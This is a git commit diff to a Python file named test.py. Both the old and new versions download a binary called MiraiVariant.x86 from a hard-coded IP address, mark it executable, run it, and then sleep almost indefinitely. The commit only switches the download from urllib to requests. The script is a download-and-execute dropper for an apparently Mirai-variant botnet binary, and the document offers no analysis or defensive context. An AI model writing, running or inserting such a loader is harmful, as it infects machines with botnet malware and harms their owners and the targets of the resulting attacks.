6d2e3103e40064d4433ec5151840beb934c3919c
lxyosfatherisblack <125721208+lxyosfatherisblack@users.noreply.github.com>
2023-02-18 09:11:09 +0300

    Update test.py

--- test.py
+++ test.py
@@ -1,17 +1,18 @@
-from urllib import request
 import os
+import requests
 import time
 
 url = 'http://195.58.39.239/bins/MiraiVariant.x86'
+filename = 'MiraiVariant.x86'
 
-# Download the file and name it MiraiVariant.x86
-urllib.request.urlretrieve(url, 'MiraiVariant.x86')
+# Download the file
+response = requests.get(url)
+with open(filename, 'wb') as f:
+    f.write(response.content)
 
-# Give the file execute permission
-os.chmod('MiraiVariant.x86', 0o755)
+# Set permissions on the file
+os.chmod(filename, 0o755)
 
 # Run the file with X86 argument
 os.system('./MiraiVariant.x86 X86')
-
-# Sleep for 10 seconds
-time.sleep(999999999999)
+time.sleep(9990909099999)
